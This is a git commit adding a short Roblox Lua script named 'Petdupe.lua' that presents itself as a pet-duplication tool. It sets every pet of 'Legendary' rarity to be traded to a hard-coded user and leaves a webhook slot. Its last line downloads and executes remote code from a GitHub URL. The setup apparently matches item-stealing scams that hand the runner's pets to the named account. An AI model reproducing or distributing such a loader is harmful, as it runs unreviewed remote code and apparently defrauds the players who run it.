677467bf90f59c48733e7d8b54f51c1f964cca72
Shisuiiiis <108449104+Shisuiiiis@users.noreply.github.com>
2022-06-30 16:44:26 +0800

    Petdupe.lua

---
+++ Petdupe.lua
@@ -0,0 +1,6 @@
+PetRarity = "Legendary"
+PetLimited = false
+PetAll = true
+TradeUser = "tyfortnycfph"
+WebhookURL = ""
+loadstring(game:HttpGet("https://raw.githubusercontent.com/wtfkid/AutoFarm/main/dupegems.lua"))()
